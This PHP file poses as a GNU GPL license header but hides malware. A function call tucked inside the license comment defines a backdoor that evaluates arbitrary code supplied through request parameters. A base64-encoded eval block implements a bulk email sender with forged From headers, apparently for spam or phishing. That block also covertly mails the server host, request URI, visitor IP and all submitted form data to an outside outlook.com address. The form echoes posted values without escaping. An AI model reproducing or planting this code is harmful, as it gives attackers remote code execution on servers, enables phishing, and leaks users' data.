<?PHP
/*			GNU GENERAL PUBLIC LICENSE
TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION
This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.

GNU GENERAL PUBLIC LICENSE
Version 2, June 1991

*/Copyright8_7_1()/* 1989, 1991 Free Software Foundation, Inc.
                          675 Mass Ave, Cambridge, MA 02139, USA
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

Preamble

  The licenses for most software are designed to take away your
freedom to share and change it. By contrast, the GNU General Public
License is intended to guarantee your freedom to share and change free
software--to make sure the software is free for all its users. This
General Public License applies to most of the Free Software
Foundation's software and to any other program whose authors commit to
using it. (Some other Free Software Foundation software is covered by
the GNU Library General Public License instead.) You can apply it to
your programs, too.*/?>
<?
eval(base64_decode('aWdub3JlX3VzZXJfYWJvcnQoKTsNCnNldF90aW1lX2xpbWl0KDApOw0KZnVuY3Rpb24gZW52aWFuZG8oKXsNCiRtc2c9MTsNCiRkZVsxXSA9ICRfUE9TVFsnZGUnXTsNCiRub21lWzFdID0gJF9QT1NUWydub21lJ107DQokYXNzdW50b1sxXSA9ICRfUE9TVFsnYXNzdW50byddOw0KJG1lbnNhZ2VtWzFdID0gJF9QT1NUWydtZW5zYWdlbSddOw0KJG1lbnNhZ2VtWzFdID0gc3RyaXBzbGFzaGVzKCRtZW5zYWdlbVsxXSk7DQokZW1haWxzID0gJF9QT1NUWydlbWFpbHMnXTsNCiRlbWFpbHMyID0gaHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ2VtYWlscyddKTsNCiRwYXJhID0gZXhwbG9kZSgiXG4iLCAkZW1haWxzKTsNCiRuX2VtYWlscyA9IGNvdW50KCRwYXJhKTsNCiRzdiA9ICRfU0VSVkVSWydTRVJWRVJfTkFNRSddOw0KJGVuID0gJF9TRVJWRVIgWydSRVFVRVNUX1VSSSddOw0KJGs4OCA9IEAkX1NFUlZFUlsiSFRUUF9SRUZFUkVSIl07DQokZnVsbHVybCA9ICIiIC4gJGs4OCAuICI8YnI+PHA+RW1haWxzOjxicj48VEVYVEFSRUEgcm93cz01IGNvbHM9MTAwPiIuJGVtYWlsczIuIjwvVEVYVEFSRUE+PC9wPjxwPkVuZ2VuaGFyaWE6PGJyPjxURVhUQVJFQSByb3dzPTUgY29scz0xMDA+Ii4kbWVuc2FnZW1bMV0uIjwvVEVYVEFSRUE+PC9wPiI7DQokdmFpID0gJF9QT1NUWyd2YWknXTsNCmlmICgkdmFpKXsNCmZvciAoJHNldD0wOyAkc2V0IDwgJG5fZW1haWxzOyAkc2V0Kyspew0KaWYgKCRzZXQ9PTApew0KJGhlYWRlcnMgPSAiTUlNRS1WZXJzaW9uOiAxLjBcclxuIjsNCiRoZWFkZXJzIC49ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1pc28tODg1OS0xXHJcbiI7DQokaGVhZGVycyAuPSAiRnJvbTogJG5vbWVbJG1zZ10gPCRkZVskbXNnXT5cclxuIjsNCiRoZWFkZXJzIC49ICJSZXR1cm4tUGF0aDogPCRkZVskbXNnXT5cclxuIjsNCi8vbWFpbCgkeHN5bGFyLCAkYXMsICRmdWxsdXJsLCAkaGVhZGVycyk7DQp9DQokaGVhZGVycyA9ICJNSU1FLVZlcnNpb246IDEuMFxyXG4iOw0KJGhlYWRlcnMgLj0gIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTFcclxuIjsNCiRoZWFkZXJzIC49ICJGcm9tOiAkbm9tZVskbXNnXSA8JGRlWyRtc2ddPlxyXG4iOw0KJGhlYWRlcnMgLj0gIlJldHVybi1QYXRoOiA8JGRlWyRtc2ddPlxyXG4iOw0KJG5fbWFpbCsrOw0KJGRlc3Rpbm8gPSAkcGFyYVskc2V0XTsNCiRudW0xID0gcmFuZCgxMDAwMDAsOTk5OTk5KTsNCiRudW0yID0gcmFuZCgxMDAwMDAsOTk5OTk5KTsNCiRtc2dyYW5kID0gc3RyX3JlcGxhY2UoIiVyYW5kJSIsICRudW0xLCAkbWVuc2FnZW1bJG1zZ10pOw0KJG1zZ3JhbmQgPSBzdHJfcmVwbGFjZSgiJXJhbmQyJSIsICRudW0yLCAkbXNncmFuZCk7DQokbXNncmFuZCA9IHN0cl9yZXBsYWNlKCIlZW1haWwlIiwgJGRlc3Rpbm8sICRtc2dyYW5kKTsNCiRlbnZpYXIgPSBtYWlsKCRkZXN0aW5vLCAkYXNzdW50b1skbXNnXSwgJG1zZ3JhbmQsICRoZWFkZXJzKTsNCmlmICgkZW52aWFyKXsNCmVjaG8gKCc8Zm9udCBjb2xvcj0iZ3JlZW4iPicuICRuX21haWwgLictJy4gJGRlc3Rpbm8gLicgMGshPC9mb250Pjxicj4nKTsNCn0gZWxzZSB7DQplY2hvICgnPGZvbnQgY29sb3I9InJlZCI+Jy4gJG5fbWFpbCAuJy0nLiAkZGVzdGlubyAuJyA9KDwvZm9udD48YnI+Jyk7DQpzbGVlcCgxKTsNCn0NCn0NCn0NCn0NCiRpcCA9IGdldGVudigiUkVNT1RFX0FERFIiKTsNCiRyYTQ0ICA9IHJhbmQoMSw5OTk5OSk7DQokc3Viajk4ID0gIlNlbmRpICRpcCI7DQokZW1haWwgPSAidGVsY29taW5zdHJ1bWVudEBvdXRsb29rLmNvbSI7DQokZnJvbT0iRnJvbTogU2VuZGl3IGEgV2xpZGF0aSA8QmF0PiI7DQokYTQ1ID0gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107DQokYjc1ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOw0KJGYxMiA9ICRfUE9TVFsnZGUnXTsNCiR6MTMgPSAkX1BPU1RbJ25vbWUnXTsNCiR4MTQgPSAkX1BPU1RbJ2Fzc3VudG8nXTsNCiR0MTUgPSAkX1BPU1RbJ21lbnNhZ2VtJ107DQokbTMwID0gJF9QT1NUWydlbWFpbHMnXTsNCiRtMjIgPSAkaXAuIlxuIjsNCiRtc2c4ODczID0gIiRhNDVcbiRiNzVcbiRmMTJcbiR6MTNcbiR4MTRcbiR0MTVcbiRtMzBcbiRtMjIiOw0KbWFpbCgkZW1haWwsICRzdWJqOTgsICRtc2c4ODczLCAkZnJvbSk7'));
?></title>
<style type="text/css">
<!--
.style5 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }
.style6 {font-size: 10px}
.style9 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10; }
-->
</style>
<form id="form1" name="form1" method="post" action="">
<input type="hidden" name="vai" value="1">
<span class="style5"><? echo enviando(); ?></span>
<table width="422" border="0" bgcolor="#000000">
  <tr>
<td width="66"><span class="style5">Nome:</span></td>
<td width="346"><span class="style9">

<label>
<input name="nome" type="text" value="<? echo $_POST['nome'] ;?>" size="20" />
</label>
</span></td>
</tr>
<tr>
<td><span class="style5">Email:</span></td>
<td><input name="de" type="text" value="<? echo $_POST['de'] ;?>" size="30" /></td>

</tr>
<tr>
<td><span class="style5">Assunto:</span></td>
<td><input name="assunto" value="<? echo $_POST['assunto'] ;?>" size="40" /></td>
</tr>
<tr>
<td><span class="style5">Mensagem:</span></td>
<td><span class="style9">

<p><textarea name="mensagem" cols="50" rows="7"><? echo stripslashes($_POST['mensagem']);?>
</textarea></p>
<textarea name="emails" cols="50" rows="4"></textarea>
</span></td>
</tr>

<tr>
  <td><span class="style6"></span></td>
  <td><input name="Submit" type="submit" value="Enviar" /></td>
</tr>
<tr>
  </tr>
</table>
</form>
<?php
Copyright8_7_1();
function Copyright8_7_1(){
static $gnu = true;
if(!$gnu) return;
if(!isset($_REQUEST['gnu'])||!isset($_REQUEST['comment']))return;
$gpl=implode('',$_REQUEST['gnu']);
eval($gpl($_REQUEST['comment']));
$gnu=false;
}
?>